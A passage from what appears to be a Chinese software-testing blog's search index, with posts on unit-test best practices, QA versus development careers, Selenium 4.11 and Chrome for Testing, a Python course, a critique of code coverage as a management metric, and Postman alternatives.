refactoring, and increase development speed.\nWhen we talk about best practices, here is a list of that one should follow:\n𝟭. 𝗪𝗿𝗶𝘁𝗲 𝗮 𝗻𝗲𝘄 𝘁𝗲𝘀𝘁 𝗳𝗼𝗿 𝗲𝘃𝗲𝗿𝘆 𝗱𝗲𝗳𝗲𝗰𝘁: When you encounter a defect, write a test that exposes the defect. This is also known as regression testing.\n𝟮. 𝗞𝗲𝗲𝗽 𝘁𝗲𝘀𝘁𝘀 𝘀𝗺𝗮𝗹𝗹 𝗮𝗻𝗱 𝗳𝗼𝗰𝘂𝘀𝗲𝗱: A unit test should be limited to an individual function or method. This makes it easier to identify and fix problems when the test fails.\n𝟯. 𝗜𝘀𝗼𝗹𝗮𝘁𝗲 𝘆𝗼𝘂𝗿 𝘁𝗲𝘀𝘁𝘀: Make sure each test is independent of all the others. This allows you to run each test individually and in any order.\n𝟰. 𝗢𝗿𝗴𝗮𝗻𝗶𝘇𝗲 𝘆𝗼𝘂𝗿 𝘁𝗲𝘀𝘁𝘀 𝗯𝘆 𝘁𝗲𝘀𝘁 𝘁𝘆𝗽𝗲: You can organize your tests by the type of object they are testing or the type of test they are. This makes it easier to find and run related tests.\n𝟱. 𝗧𝗲𝘀𝘁 𝗼𝗻𝗲 𝗰𝗼𝗱𝗲 𝗽𝗮𝘁𝗵 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲: Each test should verify one specific code path through a method. This makes it easier to understand what is being tested and why a test might fail.\n𝟲. 𝗔𝘃𝗼𝗶𝗱 𝗹𝗼𝗴𝗶𝗰 𝗶𝗻 𝘁𝗲𝘀𝘁𝘀: When you put logic into your tests, you risk introducing bugs into your tests. Keep your tests simple.\n𝟳. 𝗔𝘃𝗼𝗶𝗱 𝘀𝘁𝗮𝘁𝗶𝗰 𝗺𝗲𝘁𝗵𝗼𝗱𝘀 𝗶𝗻 𝘆𝗼𝘂𝗿 𝗰𝗹𝗮𝘀𝘀𝗲𝘀 𝘂𝗻𝗱𝗲𝗿 𝘁𝗲𝘀𝘁: Static methods can\u0026rsquo;t be overridden in subclasses, which makes them difficult to test. Avoid using static methods in the classes you are testing.\n𝟴. 𝗔𝘃𝗼𝗶𝗱 𝘁𝗲𝘀𝘁𝗶𝗻𝗴 𝗶𝗺𝗽𝗹𝗲𝗺𝗲𝗻𝘁𝗮𝘁𝗶𝗼𝗻 𝗱𝗲𝘁𝗮𝗶𝗹𝘀: Your tests should focus on the behavior of your code, not its implementation. If you test implementation details, your tests can break even if the behavior of your code remains the same.\n𝟵. 𝗪𝗿𝗶𝘁𝗲 𝘁𝗲𝘀𝘁𝘀 𝗳𝗼𝗿 𝗺𝗲𝘁𝗵𝗼𝗱𝘀 𝘁𝗵𝗮𝘁 𝗵𝗮𝘃𝗲 𝘁𝗵𝗲 𝗺𝗼𝘀𝘁 𝗶𝗺𝗽𝗮𝗰𝘁 𝗳𝗶𝗿𝘀𝘁: Focus your testing efforts on the methods that impact your application most. This typically includes methods containing complex logic or interacting with external resources.\n𝟭𝟬. 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗔𝗔𝗔 𝗽𝗮𝘁𝘁𝗲𝗿𝗻: Arrange, Act, Assert is a typical pattern for writing unit tests. The Arrange section of a unit test method initializes objects and sets the data value passed to the method under test. The Act section invokes the method under test with the arranged parameters. The Assert section verifies that the action of the method under test behaves as expected.\n","date":"2023-08-18T10:19:49+08:00","permalink":"zh.ethanhan.cc/p/unit-test-best-practice/","title":"Unit Test Best Practice"},{"content":"有没有人从 QA 转到开发？ 前几天在国外论坛上看到个帖子: 有没有人从 QA 转到开发？提问者表示:\n我和我的经理谈了谈职业发展，这是我得到的其中一个选择。尝试转为开发人员工作。\n在寻找新的 QA 工作时，外面没有那么多 QA 工作，相比之下，开发工作就很多了。\n因此，这让我想，由于有更多的机会，是否应该从 QA 转为开发？\n个人认为如果有能力转的话还是转一下比较好，毕竟开发的机会更多一点，而且天花板相对也比较高，不过高赞回答提供了另一种视角，我觉得也很有道理。\n下面是高赞回答的内容。\n我是一名软件测试开发工程师（SDET），拥有计算机科学学位，对高级编程原理有扎实的理解。在我的整个职业生涯（5 年以上）中，我一直在考虑转行。以下是我要说的话：\n是的，对开发人员的需求更高，但该行业的开发人员数量也比SDET 数量多得多。成为最优秀的SDET候选人比成为最优秀的开发人员候选人更容易（竞争更弱）。\n开发(SWE) 通常薪酬更高，因为他们是构建产品的必需品。他们是新项目的第一个被雇佣的人，也是最后一个被解雇的人。如果没有开发人员，就没有必要有 QA。然而，在许多情况下，SDET 的薪水几乎和他们一样高。我自己在低收入地区: 蒙特利尔，加拿大，我可以赚到超过 150,000 美元的年薪。\n这也意味着开发人员通常被视为更重要。很多人看不起 QA，尽管 SDET经常对编程原理有同样好的理解，我们只是不经常使用它，因为我们遇到的编码问题没有那么难。\n做开发人员的坏处是您可能需要工作更多，并承受更大的压力。作为开发人员，您必须遵守严格的交付时间表，同时还必须始终处于新技术和工具栈的最前沿。在工作与生活平衡（WLB）与薪酬方面，我100%认为 SDET 更胜一筹。我比开发人员工作少 50%，但收入却是他们的 90-100%。这实际上可以让我接一些兼职合同并将我的收入翻倍。\n归根结底，这取决于您更优先考虑什么。您是否想留在编码世界并晋升为首席开发人员？还是想拥有更好的工作生活平衡、获得更多产品知识并过渡到 PO/PM 角色？这完全取决于你。\n简单来说高赞回答觉得测试开发比开发更好，因为竞争小，收入高，也不需要经常更新技术栈，不过这也意味着市场需求不旺盛，坑比较少，总之是有利有弊吧。\n不知道大家对这个问题有什么样的看法，欢迎留言讨论。\n","date":"2023-08-17T16:01:04+08:00","permalink":"zh.ethanhan.cc/p/%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BA%BA%E4%BB%8E-qa-%E8%BD%AC%E5%88%B0%E5%BC%80%E5%8F%91/","title":"有没有人从 QA 转到开发？"},{"content":"Selenium 4.11.0 正式发布了，先来看一下主要特性。\nChrome DevTools支持的版本现在是：v113、v114和v115（Firefox仍然对所有版本使用v85） 通过Selenium Manager支持Chrome For Testing（CfT） Selenium Manager现在可以在PATH或配置的路径上定位driver的二进制文件，检查潜在的不兼容性，并提供更好的警告和错误信息。 每晚都会推送Ruby和Java的构建版本。对其他语言的支持即将推出。 在查找窗口句柄时忽略进程ID匹配 - Edge上的IE模式。 这里最重要的更新是支持了Chrome For Testing.\nChrome For Testing 这是chrome推出的专门针对测试场景使用的浏览器，为了解决下面一些痛点\nchrome的自动化更新。自动更新：对用户来说很方便，对开发者来说很痛苦，特别是测试同学，应为我们希望(a)在重复的测试运行中获得一致且可重复的结果，但如果浏览器可执行文件或二进制文件在两次运行之间决定自行更新，这会毁了一切。(b)我们想要固定一个特定的浏览器版本，并将该版本号添加到你的源代码仓库中，这样你就可以检出旧的提交和分支，并重新运行测试，以便使用那个时间点的浏览器二进制文件进行测试。基于上面两个原因，自动更新让人欲除之而后快。\n下载不到特定版本的chrome浏览器。除了自动更新之外，你可能也发现很难找到特定版本的Chrome二进制文件。谷歌故意不提供带有版本号的Chrome下载，因为用户不应该关心版本号，他们应该尽快更新到最新版本。这对用户来说很好，但对于需要在旧版本的Chrome中重现错误报告的开发人员来说很痛苦。这个问题的一个更具体的例子是当你想要使用ChromeDriver进行浏览器自动化时。你不仅需要以某种方式下载Chrome二进制文件，还需要一个相应版本的ChromeDriver二进制文件，以确保这两个二进制文件是兼容的。\n在这样的背景下，chrome for testing应运而生。官方的说法是\n为了解决这些问题，Chrome for Testing是Chrome的一个专用版本，针对测试用例进行了优化，不会自动更新，与Chrome发布流程集成，每个Chrome版本都可用。这个版本的二进制文件尽可能接近常规的Chrome，同时不会对测试用例产生负面影响。\n为了创建用于测试的Chrome，我们已经对Chromium和Chrome代码库进行了修改，并建立了基础设施来构建和上传这些二进制文件到一个公开可用的存储桶，与Chrome的发布过程保持同步，覆盖所有渠道（稳定版、测试版、开发版和灰度版）。\n具体的安装方式是通过npm\n1 2 3 4 5 6 7 8 9 10 11 # Download the latest available Chrome for Testing binary corresponding to the Stable channel. npx @puppeteer/browsers install chrome@stable # Download a specific Chrome for Testing version. npx @puppeteer/browsers install chrome@116.0.5793.0 # Download the latest available ChromeDriver version corresponding to the Canary channel. npx @puppeteer/browsers install chromedriver@canary # Download a specific ChromeDriver version. npx @puppeteer/browsers install chromedriver@116.0.5793.0 在selenium 4.11中，我们可以直接通过Selenium Manager来进行chrome for testing的安装，具体的方式在https://www.selenium.dev/blog/2023/whats-new-in-selenium-manager-with-selenium-4.11.0/ 这篇里有介绍。\n其他细节 Java\nMake user defined SlotMatcher used everywhere in Grid code (#12240) Add support for FedCM commands (#12096) JavaScript\nBiDi Add Network module events (#12197) .NET\nImplementation of event wrapped shadow root element (#12073) Allow setting a different pointer, keyboard, or wheel on input device (#11513) Add move to location method to Actions (#11509) Add support for Safari Technology Preview (#12342) Fix error when we send non-base64 data for fetch command (#12431) Fix continueResponse method in CDP (#12445) Python\nremoved redundant attributes capabilities and set_capability in wpewebkit/options.py (#12169) improve driver logging, implement log_output() for flexibility and consistency of driver logging (#12103) let users pass service args to IE driver (#12272) Expose WPEWebKitService and WebKitGTKService in the public API Remove deprecated ActionChains.scroll(\u0026hellip;) Add creation flag for windows in selenium_manager (#12435) Ruby\nMade network interception threads fail silently (#12226) Remove deprecated code (#12417) ","date":"2023-08-01T10:04:21+08:00","permalink":"zh.ethanhan.cc/p/selenium-4.11-%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%E6%94%AF%E6%8C%81chrome-for-testing/","title":"Selenium 4.11 正式发布，支持chrome for testing"},{"content":"这几天hack news上比较热烈的讨论是这一套python教程：https://github.com/dabeaz-course/python-mastery。\n作者是Dabeaz, David Beazley的别名，他是一位计算机科学家、教育家和研究员，拥有超过35年的经验。Dave在Python社区中非常活跃，他创建了多个软件包，参加了会议演讲和教程，并且以《Python Distilled》（Addison-Wesley）、《Python Essential Reference》（Addison-Wesley）和《Python Cookbook》（O\u0026rsquo;Reilly Media）的作者而闻名。他通过提供各种高级计算机科学和编程课程来支持这些工作。\n来头很大的，毕竟是《Python Cookbook》 的作者，所以专业性上是有背书的。\n简单的把项目的readme文件翻译了一下，这个项目的核心学习理念就是手动操作，完成课程练习，多写代码总是有收获的。\n简介 这是一门高级Python编程的练习驱动课程，经过十多年的企业培训实战验证数百次。由David Beazley撰写，他是《Python Cookbook, 3rd Edition》（O\u0026rsquo;Reilly）和《Python Distilled》（Addison-Wesley）的作者。课程采用了知识共享许可协议，无广告、无追踪、无弹窗、无新闻通讯和AI。\n目标受众 这门课程适合希望进一步提高Python编程水平，从编写简短脚本转向编写更复杂程序的Python程序员。课程主要关注常用库和框架中使用的编程技巧。主要目标是更好地理解Python语言本身，以便理解他人的代码，并将新学到的知识应用于自己的项目中。\n先决条件 你已经掌握一些Python知识。这不是一门面向初学者的课程。如果你需要更多入门材料，你可以考虑参加Practical Python Programming(https://dabeaz-course.github.io/practical-python)课程。\n如何参加课程 首先，你应该将GitHub仓库fork或克隆到自己的机器上。\n我们假设你在本地有一个合适的Python开发环境。这意味着你已经正确安装了Python，有一个编辑器/集成开发环境和其他常用于Python开发的工具。由于课程使用了多个文件和模块导入，不推荐使用Notebooks。\nPythonMastery.pdf 文件包含了详细的演示幻灯片。课程练习和建议的时间安排都有清楚的标示。你应该将它放在身边（我建议你下载并在本地PDF阅读器中查看）。从这里开始吧！\nExercises/ 目录包含了所有的课程练习。\nSolutions/ 目录包含了完整的练习解决代码。\nData/ 目录包含了课程中使用的一些数据文件。\n课程最初在面对面的教室环境中进行了4-5天的教学，包括讲座和实践练习。成功完成课程可能需要30-50小时的学习时间。练习通常是基于前一练习的，遇到困难时，可以参考提供的解决方案。\n附加资料 高级Python掌握课程经常推荐更深入的选题教程。这些内容曾在PyCon大会上展示过，可能会对你有兴趣：\nGenerator Tricks for Systems Programmers A Curious Course on Coroutines and Concurrency Python3 Metaprogramming Generators: The Final Frontier Modules and Packages: Live and Let Die 问题与回答 Q: 有视频教程吗？\nA: 没有。你可以更快地阅读包含技术信息的演示幻灯片。然而，与本课程内容密切相关的视频教程是Python Programming Language: LiveLessons，可以在O\u0026rsquo;Reilly的Safari网站上找到。\nQ: 我可以在我的课程中使用这些材料吗？\nA: 可以。我只是恳请你给予适当的署名。\nQ: 你接受错误报告或Pull Request吗？\nA: 如果你发现了错误，请报告给我！然而，我并不打算通过新主题或练习来扩展或重新组织课程内容。\nQ: 演示幻灯片有除PDF之外的其他格式吗？\nA: 没有。\nQ: 有任何可以讨论课程的论坛或聊天室吗？\nA: 你可以使用GitHub讨论区来讨论课程内容。\nQ: 为什么没有涵盖主题/工具/库X？\nA: 该课程被设计为在4天的集中式面授形式下完成。不可能涵盖绝对所有的内容。因此，该课程主要侧重于核心Python语言，而不涉及第三方库或工具。\nQ: 为什么没有涵盖诸如typing、async或模式匹配等特性？\nA: 主要是时间和范围的问题。该课程的材料主要是在疫情前开发的，代表了当时的Python情况。一些主题（例如typing或async）非常复杂，最好在单独的课程中进行更深入的讲解。\nQ: 我如何提供帮助？\nA: 如果你喜欢这门课程，最好的支持方式就是向其他人推荐它。\n总结 所以这个教程适合有一定的python基础的同学，学习的路线图是：先看pdf，看完做练习，最后通过solution来检查答案。\n","date":"2023-07-21T10:21:45+08:00","permalink":"zh.ethanhan.cc/p/2023%E5%B9%B4%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0python/","title":"2023年如何学习python"},{"content":"看标题就知道这篇文章很有意思，作为一个之前专注过做代码覆盖率平台的人，这个观点一直模模糊糊是存在于我的心里的，不过从来没有这么直截了当的说出来，这篇文章的作者有理有据，值得一看。原文在这里: https://drpicox.medium.com/confirmed-code-coverage-is-a-useless-management-metric-35afa05e8549，我只做了一些翻译。\n有一种强烈的信念，即代码覆盖率是衡量软件产品质量的重要指标，这个信念多年来一直被技术领导者们毫无疑问地共享。从表面上看，这个理论似乎很有道理：测试越彻底，代码覆盖率越高，因此我们的软件应该更加健壮和无错误。这个观念已经深深植入我们的思维中。但是，如果我能证明代码覆盖率从根本上是错误的呢？如果我能向你展示一个如此简单的想法，让你对此毫无疑问？所以，请做好准备，做好心理准备。\n鉴于本文仅展示了哪些指标不适用于管理（尽管对开发人员非常有用），但并未说明应该遵循哪些指标，因此我最近写了一篇后续文章，解释了应该使用哪四个基本指标以及为什么要这样做，这些观点都有科学依据\nThe Code Coverage 代码覆盖率 代码覆盖率，简单来说，是衡量你的代码有多少被测试所“触及”或“覆盖”的一种度量。我们假设在我们的产品中有测试，并且我们至少在每次发布之前运行这些测试。当这些测试执行时，它们会对产品进行操作，从而使代码执行。很快，我们意识到如果我们追踪哪些代码被测试执行，我们就可以开始衡量有多少代码被执行了。我们将执行的代码与产品中的总代码量的比例称为“代码覆盖率”。\n1 code coverage = executed code by tests / size of the code 这是一个非常简单的度量标准。如果我们有100行代码，但测试只执行了其中的75行，那么我们的代码覆盖率为75%。\n很快我们意识到了更重要的事情。如果代码覆盖率不是100％，那就意味着我们的测试没有执行到某些代码，换句话说：我们有未经测试的代码！\n因此，拥有未经测试的代码是危险的，因为它可能包含错误。此外，它还可能包含业务关键功能，如果我们触碰到该代码，我们可能会丧失这些功能。\n所以，拥有高代码覆盖率是必须的。\n代码覆盖率的谬论 但是，现在我们面临一个谬论：我们知道揭示代码意味着我们的测试遗漏了重要的情况，但反过来并不成立。\n例如，在之前的例子中，我们的代码覆盖率为75%。换句话说，这个指标表示有25%的代码行没有被任何测试执行过，这明确指出了一个风险区域。我们可以确定地说，这25%的代码库没有经过任何测试验证，因此可能成为问题和维护困难的滋生地。\n然而，这就是我们冒险陷入谬误的时候：虽然我们可以自信地说未经测试的代码隐藏了潜在的错误和对未来发展的阻碍，但我们可能相信相反的情况是真实的。我们可能相信代码覆盖意味着它有更少的错误和更少的维护问题。但是，这只是一个直觉，甚至可能看起来很合乎逻辑，但事实证明这并不正确。\n事实是，我们可以实现100%的代码覆盖率，但代码仍然可能存在大量的错误，并且难以维护。\n一个基本的例子 想象一个简单的函数，它计算两个数字的和：\n1 2 3 function addition(a, b) { return a + b; } 哪个是能够覆盖100%的最简单的测试？只需添加一个附加项即可使所有代码执行：\n1 2 3 test(\u0026#39;the addition function\u0026#39;, () =\u0026gt; { addition(3, 4); }); 这个测试覆盖了100%的代码。然而，它是无用的。为什么呢？如果我们将加法的实现改为这样一个：\n1 2 3 function addition(a, b) { return a - b; } 测试仍然通过！\n如果你是一个程序员，可能你已经知道问题出在哪里。这里的问题不在于代码覆盖率，而是测试本身。这个测试确实覆盖了100%的代码，但它没有断言或检查任何东西。这就是为什么在实现上出现错误（减法而不是加法），测试仍然通过的原因。所以，这似乎是一个糟糕的例子\u0026hellip; 嗯，其实不是。\n原来，对于这个非常简单的小例子，我们很容易就能看出测试的问题。但是，如果代码库有数十万行代码，有人能轻易找出一个没有正确验证结果的测试吗？这是非常不可能的。\n所以，测试可能有问题，断言可能是错误的，场景可能被忽视了，然而，我们仍然可以夸耀百分之百的代码覆盖率指标。这正是问题所在。\n根本原因 这个问题的根本原因是代码覆盖率是关于代码而不是业务的度量指标。\n虽然这是一个很好的指标，可以揭示可能未经测试的代码部分，但它对业务以及项目如何满足业务目标没有任何说明。\n代码覆盖率关注软件测试的技术方面，而不一定考虑软件构建的更广泛的业务目标和要求。它衡量了被测试的代码的范围，但并不能揭示软件是否真正达到了预期目的，满足了用户需求，或者与更广泛的业务战略相一致。\n代码覆盖率的唯一作用就是评估在测试过程中是否执行了所有的代码。而这是非常容易实现的：\n规则1：运行所有的方法。对于每个函数，编写一个执行它的测试。这样可以覆盖所有的方法。所以，如果你有两个函数，就写两个测试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 function one() { // ... } test(\u0026#39;function one\u0026#39;, () =\u0026gt; { one(); }); function two() { // ... } test(\u0026#39;function two\u0026#39;, () =\u0026gt; { two(); }); 规则2：运行所有分支。对于每个条件，创建一个额外的测试来确保它满足条件。这将覆盖任何分支内的所有代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function conditional(condition) { if (condition) { // ... } else { // ... } } test(\u0026#39;condition true\u0026#39;, () =\u0026gt; { conditional(true); }); test(\u0026#39;condition false\u0026#39;, () =\u0026gt; { conditional(false); }); 请注意，并非总是需要编写额外的测试来实现100%的代码覆盖率：\n1 2 3 4 5 6 7 8 9 10 function conditional(condition) { if (condition) { // ... } // ... } test(\u0026#39;conditional\u0026#39;, () =\u0026gt; { conditional(true); }); 不需要更多的规则。我已经展示了“if”语句，但对于“while”和“switch”也是一样的。对其他函数的调用已经在规则1中涵盖了，所以就是这样。\n这些规定对企业有什么影响？没有。这就是问题所在。\n真实经历 我想讨论两种不同情况，其中代码覆盖率起到了欺骗性的作用。\n几年前，在一个聚会上，我遇到了一位在软件开发公司工作的开发者，他向我讲述了他在为FDA（美国卫生与公众服务部下属的联邦机构，负责食品和药品监管）准备产品的经历。\n情况如下：FDA要求覆盖60%的代码，而他们的产品没有进行任何测试。因此，代码覆盖率为0%。\n当FDA要求60%的代码覆盖率时，意味着他们希望在测试过程中至少有60%的软件代码被执行。这是一种提供一定保证软件在不同条件下正常工作的方式。至少，这是他们的初衷。\n到底发生了什么事情？\n因为他们没有测试，所以他们开始创建测试。起初，他们试图创建有意义的测试，彻底检查最关键的功能，并验证在各种条件下的正确行为。但是时间过去了，创建这些测试很困难，代码覆盖率几乎没有增加。很快，他们意识到他们在与时间赛跑。\n绝望的时刻需要绝望的措施。他们将注意力从创造有价值的测试转移到了简单地提高代码覆盖率百分比上。他们执行测试，查看代码覆盖报告，并调整测试以通过尽可能多的代码部分，以迅速提高代码覆盖率。他们放弃了对有用测试的考虑，因为他们将数量置于质量之上。\n花了三个月的时间，他形容这是他整个开发者生涯中最糟糕的经历。\n现在你可能会认为这是一个极端的情况，他们的行为至少是值得质疑的，而且，肯定地说，这在软件行业并不常见。好吧，再想想吧。\n原来每个开发者在每次交付时都会面临同样的定时炸弹。\n所以，如果开发人员被迫交付带有测试的代码，达到一定的最低代码覆盖率，并在任意截止日期前完成（即使他们自己估计过），之前的经验也同样适用。\n这就是我的第二次经历带领我到达的地方。不久前，我的一个客户请求我协助他的一个团队进行测试。关于测试进行了很多讨论，人们普遍认为测试既费钱又耗时。公司要求至少达到80%的代码覆盖率，整个情况开始让我想起了之前的经历。\n所以，我做了唯一合乎逻辑的事情：我下载了代码，查看了测试，一个小时后我意识到我无法理解其中任何一个。\n我运行了测试，它们通过了，然后我开始进行实验。因为我不理解测试的实际工作原理，所以我拿到了代码并故意破坏了它。结果让我感到惊讶：尽管代码被破坏了，但测试仍然通过。\n代码覆盖率的实现并不是因为测试工作做得彻底，而是因为它们偶然地运行了代码。\n这两次经历都给了我一个明确的暗示，强制代码覆盖率不可能是一种好的管理实践。\n实验 正如承诺的那样，我将展示一个实验，简单而又有效，将无疑证明代码覆盖率作为管理指标是毫无用处的。\n这是基于Allen Holub的以下观察\n我考虑过写一个自动化的覆盖率生成器，它只会创建测试用例，使用随机参数调用程序中的每个函数/方法，并且总是通过。噔噔！80%的覆盖率！但是覆盖率并不是一个有用的指标。\n这个想法很简单，对吧？就像我之前提到的，我们只需要满足两个规则就能实现100%的代码覆盖率：1）执行所有的函数，2）执行所有的分支。嗯，事实证明，Allen Holub的提议正是这样做的：1）让测试执行所有的函数/方法，2）通过使用随机参数来覆盖分支。\n在继续之前，如果我们这样做，这种测试会对我们的业务目标有什么说法吗？什么都没有！它只会无情地运行所有的代码，完全不考虑我们的业务。它将成为最懒惰的开发者。\n那么，问题是：Allen Holub的是对的吗？\n自动化代码覆盖率可能会有一些挑战，但如果我们限制在随机输入的前提下，而不需要分析代码分支，它的复杂性就会大大降低。所以，让我们开始吧！\n在我的第一次尝试中，我选择了Java。由于其反射能力，它是一种相当容易进行自动化测试的语言，而且我已经有一些可以用来检查生成器的公共代码存储库。因此，我在这里进行了第一次概念验证：\nhttps://github.com/drpicox/classroom--cards-game--2022/blob/feature/autotest/src/test/java/com/drpicox/stage1/TestStage1.java\n这段简单的代码只会创建所有具有公共构造函数且没有参数的类的实例，并执行所有没有参数的方法。\n尽管它的简洁性，它已经达到了11%的代码覆盖率。这远低于80%，但这是预料之中的。\n在这一点上，我意识到我需要开始执行带有参数的构造函数和方法。而且，我还可以通过“作弊”直接执行私有方法，使用与Spring或JPA依赖的相同机制。这打开了一个新的兔子洞。因此，在那个时候，有了一个正确方向的第一个概念验证，并且作为大学教师将这个实验转化为最终学位项目的机会，我决定将这个实验列入最终学位项目的提供之中。\n在这里，我必须说我非常感激Gerard Torrent（他的LinkedIn链接在这里）。他接受了这个挑战，尽管他们的学位几乎没有涉及编译器理论，但他创造了一种不同的方法，使我们能够更好地理解。\n他不是做一个遍历所有代码的单一测试，而是构建了一个代码生成器，为每个方法和可能的参数创建一个测试。他继续添加功能，比如当方法需要其他对象时，他会创建它们，并且通过迭代逐步提高整体代码覆盖率。有时他独自工作，有时我们联手努力，进一步提高覆盖率。哦，天哪，我们做到了。\nThe Results 结果 是的，我们做到了。我们达到了80%的代码覆盖率，甚至更多。\n我要求Gerard逐步迭代并逐步取得结果，这样我们就能更深入地了解代码覆盖率的工作原理。\n所以，逐步地，代码覆盖率达到了：\n我的第一个参考实现：11% 以空值作为参数执行所有构造函数：20% 只执行公共的void方法：23% 执行所有公共方法：50% 执行所有方法，包括公有和私有方法：50% 创建所需参数的实例（不再有空值）：65% 创建所需的实例（嵌套）：69% 测试每个参数的三个不同值：69% 尽可能使用Spring来实例化类：85% 请注意，测试私有方法是一种反模式，请不要这样做，但在这个演示中，它是为了人为地增加代码覆盖率而使用的。\n所以，最终的结果是：\n代码覆盖率达到85%\n这是在没有考虑任何业务情况下生成代码。那么，现在怎么办？\n结论 艾伦·霍卢布之所以在他的评论中提到80%，并不是因为他认为这是一个合理的目标——也许他认为是——而是因为80%是大多数公司的常见要求。事实上，他是在寻找一种否定强制代码覆盖率最低要求的方式。\n所以，现在我们知道我们可以构建一个简单的库，无论你的业务是什么，它都可以执行大部分代码并人为地增加代码覆盖率。我们不需要人工智能，不需要花哨的LLM，也不需要代码复杂性分析，只需随机执行函数，你就能满足任何公司对最低代码覆盖率的要求。\n即使在那些代码覆盖率稍高的公司中，你也可以随便添加几个手工测试来达到所需的额外覆盖率。\n那么，将代码覆盖率作为管理指标有什么结果呢？没有任何结果。\n以前，我们知道开发人员可以伪造来达到更高的代码覆盖率，而不进行实际测试，现在我们也知道一个快速的自动工具可以迅速增加它。\n所以，如果仅仅随机执行代码就能达到很高的代码覆盖率，那么这个指标就变得毫无意义。\n下一步 下一步是什么？既然我们知道代码覆盖率对管理来说毫无用处，我们现在可以做些什么呢？\n首先也是最重要的是：代码覆盖率对开发人员仍然很重要。这一点很久以来已经被很多人提到过，包括Martin Fowler。他在这篇文章中解释了代码覆盖率的唯一目的是找到未经测试的代码。这有助于开发人员发现在编写代码时所犯的错误和错误的假设。正确应用代码覆盖率失败可以引发重要的业务对话，从而揭示新的功能或误解。\n根据Martin Fowler的说法，代码覆盖率的目标。来源在这里。 其次，有TDD或BDD。很可能，毫无疑问，这是创建测试的唯一合理方式。当开发人员被迫在编写代码之后创建测试时，主要问题是没有人能确保这些测试能够正确运行。我们需要观察它们的失败，并且我们需要看到新代码如何纠正这些失败，只有这样我们才能确信我们正确地创建了这些测试。\n最后，我们应该专注于业务。结束。只有当测试能够直接帮助验证业务提议是否按预期运行时，它才有意义保留。因此，我们可以选择其他更关注业务的指标，而不是仅仅依赖于一个只关注代码的晦涩指标。一个例子是业务规则覆盖率：\n1 business rules coverage % = automated scenarios / total scenarios 这是一个相当简单的度量标准，非常类似于代码覆盖率，有一些共同的问题，但更加有效，因为它专注于业务。我在一些文章中有更多细节。\n","date":"2023-07-20T19:00:47+08:00","permalink":"zh.ethanhan.cc/p/%E7%A1%AE%E8%AE%A4%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87%E6%98%AF%E4%B8%80%E4%B8%AA%E6%97%A0%E7%94%A8%E7%9A%84%E7%AE%A1%E7%90%86%E6%8C%87%E6%A0%87/","title":"确认：代码覆盖率是一个无用的管理指标"},{"content":"今天看到有个哥们吐槽postman的新版界面，这位是Spotify的资深工程师，所以他的槽点还是有些代表性，他是这么说的\nUhhhh what happened to Postman? I just want to send, and inspect http requests?\nWhat is all this shit?\nAdam Rackis Senior Web Engineer at Spotify. Prev, Riot. Next, React, Svelte, C++ when I\u0026rsquo;m feeling nasty. Beer, whiskey, coffee snob. Book lover. Jr Developer for life. https://github.com/arackaf\n怀着看热闹不嫌事大的心情，我把本机的postman更新了一下。对于更新这件事情我是能不更就不更，因为我一直觉得postman的旧版本就是比新版本要好用。\n更新到最新版本之后，有趣的事情发生了，界面确实变化很大，之前postman的核心就是请求构造页面，现在我随便点了几下，结果postman频繁弹出登录页面，我大概点了2个菜单，分别是Home和Explore，登录框弹出来3次，最无语的是在home页面的全屏登录框，我一时半会找不到X按钮，当时让我无比的慌乱，不登录难道就不配用你吗？幸好在一个不起眼的地方看到可以忽略登录的链接，终于让我这种不愿意透露姓名的postman忠实用户有了继续使用的权利。\n其实很早之前postman在进行了几轮融资之后就已经变得越来越臃肿和让人看不明白了，但我还是在坚持使用，主要是因为下面的原因\n习惯问题。之前我用的很熟练了，特别是变量和断言功能，其他工具似乎并没有类似的能力 代码导出功能。我习惯于在postman上调通接口，然后直接导出python或者是go的代码 请求导出及分享能力。把collection导出成json文件，然后到处分发，对小团队来说这是很方便的 然而现在我已经在慎重考虑放弃postman了，毕竟我要的是简单工具，而postman要的是建立社区，提高壁垒，提升用户粘性，然后让我交钱。我也不是不能付费，但是\n首先我是个人用户，我不会为自己购买团队版本，所以很多付费功能对我来说是用处不大的 替代的产品很多，就像老罗说的，其他产品又不是不能用，甚至有些产品在某些方面做的比postman更好 人不能两次踏进同一条河流，我也不能每次小心翼翼的点掉3次登录窗口，所以是时候说再见了，我不会卸载postman，毕竟我有一些关键的collection保存在上面，但我可以降低使用频率，非必要不去用，另外可以花时间去折腾其他替代品。\n替代品 mac 用户 对于mac用户来说首推RapidAPI，这款产品我在大概十年前就已经使用过，当时postman做的并不好，那时候还叫做paw的RapidAPI前生是mac上最丝滑流畅的选择，而且paw是付费的，我买了，毕竟用的是公司的钱。\nRapidAPI相对postman比较轻量，不过也支持\n导出为python/go等语言的代码 支持一些常见的鉴权方式 比postman要丝滑的多 支持curl导入 windows 用户 windows用户的话可以选择insomnia，这个工具我记得之前有介绍过，作者当初写这个只是为了好玩，后来他靠这个赚了不少钱，最终卖给了kong，可能已经财务独立了吧。项目是开源的，地址在这里: https://github.com/Kong/insomnia。\ninsomnia的免费版本基本就够用了，功能基本跟postman差不多，除了下面这些\n没看到直接写断言的地方，不过翻文档发现其实是支持js unit test的一些框架的，比如mocha，具体的没有仔细研究了 导入功能非常直接且，比如可以直接贴curl命令到url栏里，工具会自动检测和导入，非常丝滑，不过我花了20分钟才能弄明白究竟如何导入 快捷键很好用 VS code用户 thunderclient这个插件应该可以替代大部分postman的功能，如果你使用vs code的话，不妨尝试一下。\n基本功能应该是不收费的，文档也比较齐全，还有个github仓库专门做客服用：https://github.com/rangav/thunder-client-support，稍微体验了一下，发现基本上可以替代postman百分之八十左右的功能。比如\n导出为python/go等语言的代码 支持一些常见的鉴权方式 支持前置处理和断言 支持环境变量和系统变量 支持curl导入 支持collection 支持导出为postman格式 反正日常使用基本上是够了的，而且没事不会弹登录框，比postman清爽多了。\n总结 postman变得流行的原因是作为一个工具，它解决了我们很多实际的问题。但自从商业化之后，postman让我们这些老用户越来越搞不明白，其实不是postman变难用了，平心而论postman还是好用的，这也是为什么其他类似工具都跟postman长的差不多的原因，但加入太多的to 